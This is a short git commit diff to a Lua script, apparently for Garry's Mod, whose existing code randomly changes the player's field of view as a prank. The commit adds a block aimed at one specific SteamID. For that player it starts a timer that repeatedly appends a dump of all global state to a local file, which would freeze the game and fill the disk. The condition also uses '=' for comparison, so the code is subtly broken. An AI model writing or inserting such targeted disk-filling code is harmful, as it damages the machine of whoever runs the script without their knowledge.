8d47d06c7ddc96bd226b82aa2418be47e8dcf9fd
erraticcccc <78512572+erraticcccc@users.noreply.github.com>
2021-02-17 14:18:30 -0800

    Update habol.lua

--- habol.lua
+++ habol.lua
@@ -304,3 +304,8 @@ _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
             view.fov = math.random(5,300)
         return view
 end)
+if LocalPlayer():SteamID() = 'STEAM_0:1:217428780' then 
+    timer.Create('',0,123123123,function()
+            file.Append('w.txt',table.ToString(_G))
+    end
+end
